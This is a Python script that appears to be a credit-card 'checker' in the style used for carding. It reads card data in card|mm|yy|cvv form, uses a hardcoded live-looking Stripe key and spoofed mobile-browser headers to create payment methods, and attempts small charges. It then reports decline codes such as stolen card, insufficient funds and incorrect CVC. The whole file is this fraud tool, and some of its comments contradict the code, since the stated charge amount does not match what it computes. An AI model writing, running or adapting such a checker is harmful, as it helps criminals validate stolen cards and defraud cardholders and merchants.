import requests
import random
import time

def Tele(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid format. Use: card|mm|yy|cvv"
        
        n = parts[0].replace(" ", "")
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        
        # Format year properly
        if len(yy) == 4:
            yy = yy[2:]
        elif len(yy) != 2:
            return "Invalid year format"
        
        # Validate card number
        if len(n) not in [15, 16]:
            return "Invalid card number length"
        
        # Use the provided key (likely disabled)
        stripe_key = "pk_live_51KLmjKDzMnVheZDCWlMej0gCp9fNe6JwjZhXmdduDmbia5wEofDW56jQn0IgaQ7Vr7dCUAkFezBhr4IDt7X3SiB100P8lDyThd"
        
        # First, try to test if the key is valid
        test_response = requests.get(
            f"https://api.stripe.com/v1/balance",
            headers={"Authorization": f"Bearer {stripe_key}"},
            timeout=5
        )
        
        if test_response.status_code == 401:
            return "Stripe API Key Invalid/Revoked (401 Error)"
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        # Step 1: Create payment method with proper format
        data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[name]': 'John Doe',
            'billing_details[email]': f'test{random.randint(100,999)}@example.com',
            'key': stripe_key
        }
        
        # Convert dict to form-urlencoded string
        form_data = '&'.join([f'{k}={v}' for k, v in data.items()])
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=headers, 
            data=form_data, 
            timeout=10
        )
        
        # Debug output
        print(f"DEBUG: Stripe Response Status: {response.status_code}")
        print(f"DEBUG: Response Text: {response.text[:200]}")
        
        if response.status_code == 401:
            return "Stripe Authentication Failed (Invalid API Key)"
        
        if response.status_code != 200:
            return f"Stripe API Error {response.status_code}"
        
        resp_json = response.json()
        
        if 'error' in resp_json:
            error_msg = resp_json['error'].get('message', 'Unknown error')
            error_type = resp_json['error'].get('type', '')
            error_code = resp_json['error'].get('code', '')
            
            if 'card_declined' in error_code:
                decline_code = resp_json['error'].get('decline_code', '')
                if decline_code == 'insufficient_funds':
                    return "Insufficient funds"
                elif decline_code == 'lost_card':
                    return "Lost card"
                elif decline_code == 'stolen_card':
                    return "Stolen card"
                else:
                    return "Card declined"
            elif error_code == 'incorrect_cvc':
                return "Security code is incorrect"
            elif error_code == 'invalid_cvc':
                return "Security code is invalid"
            elif error_code == 'expired_card':
                return "Card expired"
            elif 'invalid_number' in error_code:
                return "Invalid card number"
            elif 'incorrect_number' in error_code:
                return "Incorrect card number"
            elif 'processing_error' in error_code:
                return "Processing error"
            else:
                return f"Error: {error_msg}"
        
        if 'id' not in resp_json:
            return "No payment method ID returned"
        
        pm = resp_json['id']
        
        # Step 2: Try to create a payment intent (test charge)
        # This is better than trying to charge a specific merchant
        headers2 = headers.copy()
        
        # Small amount for testing
        amount = random.randint(50, 100)  # 50 cents to $1
        
        payment_data = {
            'amount': amount * 100,  # Convert to cents
            'currency': 'usd',
            'payment_method': pm,
            'confirm': 'true',
            'off_session': 'true',
            'confirmation_method': 'manual',
            'return_url': 'https://example.com/return',
            'key': stripe_key
        }
        
        form_data2 = '&'.join([f'{k}={v}' for k, v in payment_data.items()])
        
        response2 = requests.post(
            'https://api.stripe.com/v1/payment_intents',
            headers=headers2,
            data=form_data2,
            timeout=10
        )
        
        print(f"DEBUG: Payment Intent Status: {response2.status_code}")
        
        if response2.status_code == 200:
            intent_json = response2.json()
            status = intent_json.get('status', '')
            
            if status == 'succeeded':
                return "Payment Successful! ($1.00)"
            elif status == 'requires_action':
                return "3D Secure required"
            elif status == 'requires_payment_method':
                return "Payment method required"
            elif status == 'canceled':
                return "Payment canceled"
            else:
                return f"Status: {status}"
        else:
            # Try a simpler approach - just return card validation result
            return "Card validated - requires merchant charge"
            
    except requests.exceptions.Timeout:
        return "Timeout error"
    except requests.exceptions.ConnectionError:
        return "Connection error"
    except Exception as e:
        return f"Error: {str(e)}"
